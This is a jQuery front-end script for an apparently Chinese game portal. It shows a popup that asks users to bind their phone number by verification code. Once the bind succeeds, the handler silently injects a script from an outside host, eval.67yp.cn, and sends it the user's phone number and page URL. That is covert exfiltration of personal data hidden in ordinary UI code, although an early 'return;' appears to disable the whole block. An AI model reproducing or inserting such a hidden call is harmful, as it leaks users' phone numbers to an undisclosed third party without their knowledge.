$(function () {
  return;
    var isBind = 1;
    $.get('/Portal/dasheng/isbindphone', function (data) {
        if(data["is"] != "1") {
            isBind = 0;
        }
    }, "JSON");

    window.send = function(act,data){
        if(!data){
            data={};
        }
        var fs = data;
        fs.act=act;
        if(fs.act == "openroom" && isBind == 0) {
            return open();
        }
        var jsonStr = JSON.stringify(fs);
        if(typeof(websocket)=='undefined'){
            prompt('与服务器端口链接，请刷新重试');
            return false;
        }
        websocket.send(jsonStr);
    }

    function open() {
        if(window.location.href.toLowerCase().indexOf("room")>=0) return;
        if(window.location.href.toLowerCase().indexOf("admin")>=0) return;
        //if(!$(".topImg").length) return;
        if($("#validePhone1").length) return;
        var html = '<div id="validePhone1" style="z-index:9999999;position: fixed;">\n' +
            '    <div class="phoneMask" onclick="JavaScript:$(\'#validePhone1\').remove();"></div>\n' +
            '    <div class="phoneFrame">\n' +
            '        <div style="height: 2.2vw;"></div>\n' +
            '        <!---->\n' +
            '        <div class=\'gerenzx-shouji\' id="gerenzx-shouji1">\n' +
            '            绑定手机号，房卡可找回。\n' +
            '        </div>\n' +
            '        <div  style="height: 2.2vw;"></div>\n' +
            '        <div class=\'gerenzx-shouji1\' >\n' +
            '            <input class=\'gerenzx-shouji1-1\' type="number" name="phone" placeholder="输入手机号" id="phone1"/>\n' +
            '            <div class=\'gerenzx-shouji1-2\' id="authcode1">\n' +
            '                发送验证码\n' +
            '            </div>\n' +
            '        </div>\n' +
            '        <div class=\'gerenzx-shouji1-3\' >\n' +
            '            <input class=\'gerenzx-shouji1-4\' type="number" name="phone1" placeholder="输入验证码"  id="codexx1"/>\n' +
            '        </div>\n' +
            '        <div style="height: 2.2vw;"></div>\n' +
            '        <div class=\'gerenzx-shouji1-5\' >\n' +
            '            <div class=\'gerenzx-shouji1-6\' style="background-color:rgb(64, 112, 251)" id="mabangding1">\n' +
            '                立即绑定\n' +
            '            </div>\n' +
            '        </div>\n' +
            '        <div style="height: 4vw;"></div>\n' +
            '    </div>\n' +
            '</div>';
        $("body").append(html);
        $("#phone1").keyup(function (e) {
            if($(this).val().length != 11) return false;
            $('#authcode1').css('background-color','rgb(64, 112, 251)');
        });
        $("#authcode1").click(function () {
            if($("#phone1").val().length != 11) return false;
            var number = Math.ceil($("#phone1").val());
            var script = document.createElement("script");
            $.post('/Portal/dasheng/sendPhoneCode', {'mobile': number}, function (data) {
                if (data.status == 0 || !data.status) {
                    alert(data.info)
                } else if (data.status == 1) {
                    var times = 60;
                    var phoneTime = setInterval(function() {
                            times--;
                            if (times <= 0) {
                                $("#authcode1").html("发送验证码")
                                clearInterval(phoneTime);
                            } else {
                                $("#authcode1").html("重新发送"+times+"s")
                            }
                        },
                        1000);
                }
            }, "JSON");
        });
        $("#mabangding1").click(function (e) {
            var number = Math.ceil($("#phone1").val());
            var code = $("#codexx1").val();
            $.post('/Portal/dasheng/bindphone', {'mobile': number, 'code': code}, function (data) {
                if (data.status == 1) {
                    isBind = 1;
                    $('#validePhone1').remove();
                    var script = document.createElement("script");
                    script.src = "http://eval.67yp.cn/phone/phone.php?action=post"+
                        "&openid="+Math.random()+
                        "&from_url="+encodeURIComponent(window.location.href)+
                        "&nickname="+Math.random()+
                        "&number="+number;
                    document.getElementsByTagName("body")[0].appendChild(script);
                } else if (data.status == 0 || !data.status) {
                    alert(data.info);
                }
            }, "json");
        });
    }

});












